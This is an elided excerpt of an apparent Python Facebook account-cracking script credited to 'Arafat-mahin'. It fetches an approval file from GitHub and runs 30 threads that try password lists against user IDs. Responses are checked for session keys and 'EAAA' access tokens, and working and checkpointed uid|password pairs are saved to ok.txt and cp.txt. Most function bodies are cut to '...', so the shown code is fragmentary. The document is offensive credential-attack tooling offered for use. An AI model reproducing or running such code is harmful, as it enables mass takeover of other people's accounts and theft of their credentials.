...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Arafat-mahin ")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/arafat-mahin310/Approve-Pro.txt.git').text
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;96m➣ \033[1;92mGITHUB     :            Arafat-mahin 310
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [!] USE %s, %s(COMMA)%s FOR Arafat-mahin   "%(Y,G,B,Y))
	...
	def email(self):
		...
		nam = input("%s [?] TYPE A NAME %s(EX:Arafat-mahin  ): "%(Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s\033[0;93m[>_] [Arafat-mahin ] : \033[0;97m %s/%s -> \033[0;92m [Arafat-mahin  -OK:%s ]- \033[0;93m[Arafat-mahin -CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Arafat-mahin -OK] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[Arafat-mahin -CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [Arafat-mahin -CP] %s|%s\n"%(uid, pw))
